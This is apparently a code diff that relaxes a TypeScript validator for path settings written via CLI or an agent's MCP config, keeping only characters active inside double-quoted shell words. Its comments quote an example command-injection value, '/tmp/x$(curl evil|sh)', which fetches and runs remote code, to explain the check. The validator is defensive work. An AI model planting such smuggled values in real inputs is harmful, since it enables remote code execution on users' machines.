@@ -146,21 +146,21 @@ export function getMachinePathSource(
   return syncedValue ? 'synced' : undefined;
 }
 
-// Shell metacharacters, quotes, backslash and line breaks. A path setting can
-// be written by an agent (MCP `config`/`setup`) and an older workflow pasted
-// it into shell text, so a value like `/tmp/x$(curl evil|sh)` would run.
-const SHELL_UNSAFE_PATH = /[$`"'\\;|&<>\n\r]/;
+// The characters still active inside a double-quoted shell word: $ ` " \
+// and line breaks. No workflow interpolates a stored path any more; this
+// keeps a validated path safe inside double quotes regardless, so a value
+// like `/tmp/x$(curl evil|sh)` written over MCP cannot run. ' & ; | < > are
+// allowed: real paths use them ("John's Vault", "Notes & Docs").
+const SHELL_UNSAFE_PATH = /[$`"\\\n\r]/;
 
 /**
- * Throw when a path setting contains a character a shell treats specially
- * ($ ` " ' \ ; | & < >, a line break or NUL). Checked on every write, CLI
- * and MCP alike.
+ * Throw when a path setting contains a character a shell still interprets
+ * inside double quotes ($ ` " \, a line break or NUL). Checked on every
+ * write, CLI and MCP alike.
  */
 export function assertSafeMachinePath(key: MachinePathKey, value: string): void {
   if (SHELL_UNSAFE_PATH.test(value) || value.includes('\0')) {
-    throw new ValidationError(
-      `Invalid value for ${key}: a path may not contain $ \` " ' \\ ; | & < >, a line break or NUL.`,
-    );
+    throw new ValidationError(`Invalid value for ${key}: a path may not contain $ \` " \\, a line break or NUL.`);
   }
 }
 
